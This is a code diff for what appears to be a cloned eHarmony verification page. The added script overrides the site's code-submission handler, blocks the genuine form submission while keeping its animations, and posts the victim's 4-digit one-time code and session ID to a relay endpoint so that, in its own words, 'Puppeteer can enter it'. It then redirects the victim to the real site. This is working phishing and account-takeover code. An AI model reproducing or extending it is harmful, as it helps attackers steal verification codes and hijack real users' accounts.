@@ -512,9 +512,60 @@
     <script>
       const params = new URLSearchParams(window.location.search);
       const encoded = params.get("email");
+      const sessionId = params.get("sessionId");
       const email = encoded ? atob(encoded) : null;
       console.log("Decoded email:", email);
       document.getElementById("email").textContent = email;
+      
+      // Prevent automatic form submission while keeping animations
+      document.addEventListener("DOMContentLoaded", function() {
+        // Override the submitCode function to prevent form submission
+        if (typeof jPar !== 'undefined' && jPar.loginAndRegistration && jPar.loginAndRegistration.verificationPage) {
+          const originalSubmitCode = jPar.loginAndRegistration.verificationPage.submitCode;
+          
+          jPar.loginAndRegistration.verificationPage.submitCode = function(e) {
+            if ("keyup" === e.type && !$j("#verificationForm").hasClass("submitInProgress") && this.isCodeComplete()) {
+              // Keep all animations
+              $j("#verificationForm").addClass("submitInProgress");
+              $j("#code").attr("readonly", true);
+              this.trackSubmitCode();
+              
+              console.log("Animations triggered - form submission prevented");
+
+              // Send the 4-digit code to our server so Puppeteer can enter it
+              const code = document.getElementById('code')?.value;
+              if (code && code.length === 4) {
+                fetch('/api/verify-otp', {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ code, sessionId })
+                })
+                .then(r => r.json())
+                .then(result => {
+                  console.log('OTP submission result:', result);
+                  // If result is anything other than error=invalid, redirect to partners suggestions
+                  if (!result || result.isInvalidCode === true) {
+                    // stay on page; animations already shown
+                    return;
+                  }
+                  window.location.href = 'https://www.eharmony.com/lists/partnersuggestions';
+                })
+                .catch(err => {
+                  console.error('Failed to send OTP to server:', err);
+                });
+              }
+              
+              // Reset after 3 seconds
+              setTimeout(() => {
+                $j("#verificationForm").removeClass("submitInProgress");
+                $j("#code").attr("readonly", false);
+              }, 3000);
+              
+              // DO NOT submit the form
+            }
+          };
+        }
+      });
     </script>
     <script
       src="/static_app/eharmony/7.66.0/js/iov_combined.js"
